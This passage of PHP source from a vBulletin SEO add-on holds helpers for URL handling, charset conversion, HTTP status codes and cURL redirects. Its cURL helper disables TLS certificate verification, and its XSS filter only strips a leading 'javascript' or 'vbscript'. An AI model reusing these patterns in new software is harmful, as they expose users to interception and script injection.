	* Class factory. This is used for instantiating the extended classes.
	*
	* @param	string			The type of the class to be called (user, forum etc.)
	* @param	vB_Registry		An instance of the vB_Registry object.
	* @param	integer			One of the ERRTYPE_x constants
	*
	* @return	vB_DataManager	An instance of the desired class
	*/
	public static function &initDataManager($classtype, &$registry, $errtype = ERRTYPE_STANDARD)
	{
		if (empty(self::$called))
		{
			// include the abstract base class
			require_once(DIR . '/includes/class_dm.php');
			self::$called = true;
		}

		if (preg_match('#^\w+$#', $classtype))
		{
			require_once(DIR . '/dbtech/dbseo/includes/class_dm_' . strtolower($classtype) . '.php');

			$classname = 'DBSEO_DataManager_' . $classtype;
			$object = new $classname($registry, $errtype);

			return $object;
		}
	}

	/**
	 * Check whether we have threaded mode
	 */
	public static function isThreaded()
	{
		global $vbulletin;

		// Default to user info
		$threadedMode = $vbulletin->userinfo['threadedmode'];

		if (!$vbulletin->userinfo['threadedmode'])
		{
			// Check the cookie
			$threadedMode = $_COOKIE[self::$config['_cookieprefix'] . 'threadedmode'];
		}

		if (isset(self::$config['allowthreadedmode']) AND !self::$config['allowthreadedmode'])
		{
			// We're not allowed to use threaded mode
			return false;
		}

		// Check the value
		return in_array($threadedMode, array('threaded', '1', '2', 'hybrid'));
	}

	/**
	 * Initialises the URL rewrite cache
	 */
	public static function subStr($str, $len)
	{
		//return preg_replace('#\s+\w+$#', '', (
		return (
			self::$config['dbtech_dbseo_enable_utf8'] ?
				preg_replace('#^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,0}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . ($len + 1) . '}).*#s', '$1', $str) :
				substr($str, 0, $len)
		);
		//));
	}

	/**
	 * Fetches a value from $_SERVER or $_ENV
	 *
	 * @param string $name
	 * @return string
	 */
	private static function fetchServerValue($name)
	{
		if (isset($_SERVER[$name]) AND $_SERVER[$name])
		{
			return $_SERVER[$name];
		}

		if (isset($_ENV[$name]) AND $_ENV[$name])
		{
			return $_ENV[$name];
		}

		return false;
	}

	private static function urlencodeQuery($url)
	{
		$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
		if (strpos($useragent, 'opera') !== false)
		{
			preg_match('#opera(/| )([0-9\.]+)#', $useragent, $regs);
			$isopera = $regs[2];
		}
		if (strpos($useragent, 'msie ') !== false AND !$isopera)
		{
			preg_match('#msie ([0-9\.]+)#', $useragent, $regs);
			$isie = $regs[1];
		}
		if (!$isie)
		{
			return $url;
		}

		$querystring = array();
		$bits = explode('?', $url);
		if ($bits[1])
		{
			$bits[1] = urldecode($bits[1]);
			$subbits = explode('&', $bits[1]);
			foreach ($subbits AS $querypart)
			{
				$querybit = explode('=', $querypart);
				if ($querybit[1])
				{
					$querystring[] = urlencode($querybit[0]) . '=' . urlencode($querybit[1]);
				}
				else
				{
					$querystring[] = urlencode($querybit[0]);
				}
			}
			return $bits[0] . '?' . implode('&', $querystring);
		}
		return $url;
	}

	/**
	*	Workaround for a UTF8 compatible parse_url
	*/
	private static function parseUrl($url, $component = -1)
	{
		// Taken from /rfc3986#section-2
		$safechars =array(':', '/', '?', '#', '[', ']', '@', '!', '$', '&', '\'' ,'(', ')', '*', '+', ',', ';', '=');
		$trans = array('%3A', '%2F', '%3F', '%23', '%5B', '%5D', '%40', '%21', '%24', '%26', '%27', '%28', '%29', '%2A', '%2B', '%2C', '%3B', '%3D');
		$encodedurl = str_replace($trans, $safechars, urlencode($url));

		$parsed = @parse_url($encodedurl, $component);
		if (is_array($parsed))
		{
			foreach ($parsed AS $index => $element)
			{
				$parsed[$index] = urldecode($element);
			}
		}
		else
		{
			$parsed = urldecode($parsed);
		}

		return $parsed;
	}

	/**
	* Removes HTML characters and potentially unsafe scripting words from a string
	*
	* @param	string	The variable we want to make safe
	*
	* @return	string
	*/
	private static function xssClean($var)
	{
		static
			$preg_find= array('#^javascript#i', '#^vbscript#i'),
			$preg_replace = array('java script',   'vb script');

		return preg_replace($preg_find, $preg_replace, htmlspecialchars(trim($var)));
	}


	/**
	* Strips out the s=gobbledygook& rubbish from URLs
	*
	* @param	string	The URL string from which to remove the session stuff
	*
	* @return	string
	*/
	private static function stripSessionhash($string)
	{
		$string = preg_replace('/(s|sessionhash)=[a-z0-9]{32}?&?/', '', $string);
		return $string;
	}

	/**
	 * Adds a query string to a path, fixing the query characters.
	 *
	 * @param 	string		The path to add the query to
	 * @param 	string		The query string to add to the path
	 *
	 * @return	string		The resulting string
	 */
	private static function addQuery($path, $query = false)
	{
		if (false === $query)
		{
			$query = DBSEO_URL_QUERY;
		}

		if (!$query OR !($query = trim($query, '?&')))
		{
			return $path;
		}

		return $path . '?' . $query;
	}

	/**
	 * Converts a string from one character encoding to another.
	 * If the target encoding is not specified then it will be resolved from the current
	 * language settings.
	 *
	 * @param	string	The string to convert
	 * @param	string	The source encoding
	 * @return	string	The target encoding
	 */
	public static function _toCharset($in, $in_encoding, $target_encoding = false)
	{
		if (!$target_encoding)
		{
			global $stylevar;
			if (!($target_encoding = $stylevar['charset']))
			{
				global $vbulletin;
				if (!($target_encoding = $vbulletin->userinfo['lang_charset']))
				{
					return $in;
				}
			}
		}

		// Try mbstring
		if (function_exists('mb_convert_encoding') AND $out = @mb_convert_encoding($in, $target_encoding, $in_encoding))
		{
			return $out;
		}

		// Try iconv
		if (function_exists('iconv') AND $out = @iconv($in_encoding, $target_encoding, $in))
		{
			return $out;
		}

		return $in;
	}

	/**
	 * Applies filtering to the text in question
	 *
	 * @param string $uri
	 * @param boolean $force404
	 *
	 * @return string
	 */
	public static function filterText($text, $allowedCharacters = null, $filterStopWords = true, $reversable = false, $keepTailSpaces = false, $appendA = true)
	{
		// Compatibility
		return DBSEO_Filter::filterText($text, $allowedCharacters, $filterStopWords, $reversable, $keepTailSpaces, $appendA);
	}

	/**
	 * Creates a SEO'd URL based on the specified library.
	 *
	 * @param string $library
	 * @param array $data
	 *
	 * @return mixed
	 */
	public static function createUrl($library, $data = array())
	{
		// Compatibility
		return DBSEO_Url_Create::create($library, $data);
	}

	/**
	 * Sends a HTTP response code
	 *
	 * @param integer $code
	 *
	 * @return integer
	 */
	public static function sendResponseCode($code = NULL)
	{
		if ($code === NULL)
		{
			// This isn't perfect, but it's the best we got
			return (isset($GLOBALS['http_response_code']) ? $GLOBALS['http_response_code'] : 200);
		}

		// Make sure this is an int, for strict standards purposes
		$code = intval($code);

		// Set a new response code
		switch ($code)
		{
			case 100: $text = 'Continue'; break;
			case 101: $text = 'Switching Protocols'; break;
			case 200: $text = 'OK'; break;
			case 201: $text = 'Created'; break;
			case 202: $text = 'Accepted'; break;
			case 203: $text = 'Non-Authoritative Information'; break;
			case 204: $text = 'No Content'; break;
			case 205: $text = 'Reset Content'; break;
			case 206: $text = 'Partial Content'; break;
			case 300: $text = 'Multiple Choices'; break;
			case 301: $text = 'Moved Permanently'; break;
			case 302: $text = 'Moved Temporarily'; break;
			case 303: $text = 'See Other'; break;
			case 304: $text = 'Not Modified'; break;
			case 305: $text = 'Use Proxy'; break;
			case 400: $text = 'Bad Request'; break;
			case 401: $text = 'Unauthorized'; break;
			case 402: $text = 'Payment Required'; break;
			case 403: $text = 'Forbidden'; break;
			case 404: $text = 'Not Found'; break;
			case 405: $text = 'Method Not Allowed'; break;
			case 406: $text = 'Not Acceptable'; break;
			case 407: $text = 'Proxy Authentication Required'; break;
			case 408: $text = 'Request Time-out'; break;
			case 409: $text = 'Conflict'; break;
			case 410: $text = 'Gone'; break;
			case 411: $text = 'Length Required'; break;
			case 412: $text = 'Precondition Failed'; break;
			case 413: $text = 'Request Entity Too Large'; break;
			case 414: $text = 'Request-URI Too Large'; break;
			case 415: $text = 'Unsupported Media Type'; break;
			case 500: $text = 'Internal Server Error'; break;
			case 501: $text = 'Not Implemented'; break;
			case 502: $text = 'Bad Gateway'; break;
			case 503: $text = 'Service Unavailable'; break;
			case 504: $text = 'Gateway Time-out'; break;
			case 505: $text = 'HTTP Version not supported'; break;
			default:
				die('Unknown http status code "' . htmlentities($code) . '"');
			break;
		}

		// Store the code we are trying to set
		$GLOBALS['http_response_code'] = $code;

		// Set the response header
		header((isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.1') . ' ' . $GLOBALS['http_response_code'] . ' ' . $text, true, $GLOBALS['http_response_code']);

		// Return the value
		return $GLOBALS['http_response_code'];
	}
}

if (!function_exists('http_response_code'))
{
	function http_response_code($code = NULL)
	{
		return DBSEO::sendResponseCode($code);
	}
}

if (!function_exists('curl_exec_follow'))
{
	function curl_exec_follow($ch, &$maxRedirects = null)
	{
		// Emulate browser
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0");

		// Ensure we always cap at 5 redirects
		$_maxRedirects = $maxRedirects === null ? 5 : intval($maxRedirects);

		if (
			!@ini_get('safe_mode')
			AND !@ini_get('open_basedir')
		)
		{
			// Normal cURL exec
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $_maxRedirects > 0);
			curl_setopt($ch, CURLOPT_MAXREDIRS, $_maxRedirects);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		}
		else
		{
			// We can't use this
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);

			if ($_maxRedirects > 0)
			{
				// Grab important variables
				$originalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
				$newUrl = $originalUrl;

				// Copy the original cURL handler
				$_ch = curl_copy_handle($ch);

				// Set a few options we need
				curl_setopt($_ch, CURLOPT_HEADER, true);
				curl_setopt($_ch, CURLOPT_NOBODY, true);
				curl_setopt($_ch, CURLOPT_FORBID_REUSE, false);

				do
				{
					curl_setopt($_ch, CURLOPT_URL, $newUrl);
					$header = curl_exec($_ch);
					if (curl_errno($_ch))
					{
						// We hit an error
						break;
					}

					$code = curl_getinfo($_ch, CURLINFO_HTTP_CODE);
					if ($code != 301 AND $code != 302)
					{
						// We hit a non-redirect
						break;
					}

					preg_match('/Location:(.*?)\n/i', $header, $matches);
					$newUrl = trim(array_pop($matches));

					if (!preg_match("/^https?:/i", $newUrl))
					{
						// Relative URL, so make sure we use the full URI
						$newUrl = $originalUrl . $newUrl;
					}
				}
				while (--$_maxRedirects);

				// Close the handle
				curl_close($_ch);

				if (!$_maxRedirects)
				{
					// We're done
					$maxRedirects = 0;
					return false;
				}

				// Go towards the new URL
				curl_setopt($ch, CURLOPT_URL, $newUrl);
			}
		}

		return curl_exec($ch);
	}
}